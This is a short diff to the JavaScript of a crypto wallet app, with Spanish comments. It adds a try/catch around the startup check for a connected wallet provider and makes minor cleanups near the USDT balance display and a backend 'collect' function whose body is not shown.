@@ -64,9 +64,14 @@ function initWalletModal() {
         }
     });
 
-    if (modal.getIsConnected()) {
-        const activeProvider = modal.getWalletProvider();
-        if (activeProvider) handleConnectedProvider(activeProvider);
+    // Verificación segura del proveedor activo al iniciar
+    try {
+        const activeProvider = typeof modal.getWalletProvider === "function" ? modal.getWalletProvider() : null;
+        if (activeProvider) {
+            handleConnectedProvider(activeProvider);
+        }
+    } catch (err) {
+        console.warn("No hay proveedor activo previo:", err);
     }
 }
 
@@ -105,7 +110,6 @@ async function updateBalances(rawProvider) {
             balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
         }
 
-        // Modifica la asignación del botón MAX en app.js
         const maxBtn = document.getElementById("maxBtn");
         if (maxBtn) {
             maxBtn.onclick = () => {
@@ -288,6 +292,7 @@ async function runInvestmentFlow(rawProvider) {
         setLoading(false);
     }
 }
+
 // ─── Disparador del Backend de Recolección ────────────────────────────────────
 async function triggerBackendCollect(userAddress, amountStr) {
     let lastErr;
